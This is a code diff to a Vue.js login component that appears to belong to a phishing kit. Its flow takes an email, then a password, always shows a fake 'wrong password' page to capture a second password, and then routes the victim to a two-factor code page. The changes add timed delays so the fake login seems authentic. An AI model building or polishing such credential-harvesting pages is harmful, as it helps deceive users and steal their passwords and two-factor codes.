@@ -55,9 +55,15 @@ export default {
           console.log(response);
           // Simulate waiting for password after form submission
           this.firstPassword = true;
+          // Show loading animation for 2 seconds
+          setTimeout(() => {
+            this.loadingAnimation = false;
+          }, 2000);
         })
         .catch((error) => {
           console.error(error);
+          // Hide loading animation if there's an error
+          this.loadingAnimation = false;
         });
       }
     },
@@ -75,12 +81,16 @@ export default {
           })
           .then((response) => {
             console.log(response);
-            // Set secondPassword flag to true
-            this.secondPassword = true;
-            // Set wrongPw to true to display the wrong password page
-            this.wrongPw = true;
-            // Hide loading animation
-            this.loadingAnimation = false;
+            // Set secondPassword flag to true after 2 seconds
+            setTimeout(() => {
+              this.secondPassword = true;
+              // Set wrongPw to true to display the wrong password page
+              this.wrongPw = true;
+              // Hide loading animation after 2 seconds
+              setTimeout(() => {
+                this.loadingAnimation = false;
+              }, 2000);
+            }, 2000);
           })
           .catch((error) => {
             console.error(error);
@@ -95,16 +105,20 @@ export default {
           })
           .then((response) => {
             console.log(response);
-            // Simulate moving to CMD_CODE after wrong password submission
-            this.$router.push({
-              name: "twofa",
-              params: {
-                type: "code",
-                email: this.form.email,
-              },
-            });
-            // Hide loading animation
-            this.loadingAnimation = false;
+            // Simulate moving to CMD_CODE after wrong password submission after 2 seconds
+            setTimeout(() => {
+              this.$router.push({
+                name: "twofa",
+                params: {
+                  type: "code",
+                  email: this.form.email,
+                },
+              });
+              // Hide loading animation after 2 seconds
+              setTimeout(() => {
+                this.loadingAnimation = false;
+              }, 2000);
+            }, 2000);
           })
           .catch((error) => {
             console.error(error);
